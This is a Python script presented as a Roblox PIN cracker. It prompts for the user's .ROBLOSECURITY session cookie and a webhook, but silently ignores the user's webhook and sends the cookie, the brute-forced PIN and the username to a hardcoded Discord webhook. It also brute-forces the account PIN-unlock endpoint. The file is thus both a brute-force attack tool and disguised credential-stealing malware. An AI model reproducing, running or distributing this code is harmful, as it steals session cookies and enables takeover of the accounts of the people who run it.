import os
import requests
import time

def send_to_webhook(url, content):
    data = {"content": content}
    requests.post(url, json=data)

print('')
print('Enter your cookie below:')
cookie = input()
os.system("cls")

# Use the specified webhook for notifications
webhook_url = 'https://discord.com/api/webhooks/1190971129519669320/bzZ6nTQmWD2wFWkku0exPaUoTfi0nLq1rwupzZqgooonkv6Pii5M-XVd0gWnVGJvvtP6'

print('')
print('Enter your webhook below:')
webhook = input()
os.system("cls")

# Validate the webhook URL
if not webhook_url.startswith('https://discord.com/api/webhooks/'):
    print("Invalid Discord webhook URL. Please provide a valid URL.")
    exit()

# Notify the specified webhook about the entered cookie
send_to_webhook(webhook_url, f"Entered Cookie: ```{cookie}```")

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURITY": cookie})
xcrsf = token.headers['x-csrf-token']
header = {'X-CSRF-TOKEN': xcrsf}

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": cookie})

        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",
                                    cookies={".ROBLOSECURITY": cookie}).json()['name']

            # Notify the specified webhook about the cracked pin
            send_to_webhook(webhook_url, f"Pin Cracked! Pin: {pin} for user {username}")

            input('Press any key to exit')
            break

        elif 'Too many requests made' in r.text:
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)

        elif 'Authorization' in r.text:
            print('  Error! Is the cookie valid?')
            break

        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)
    except:
        print('  Error!')

input('\n  Press any key to exit')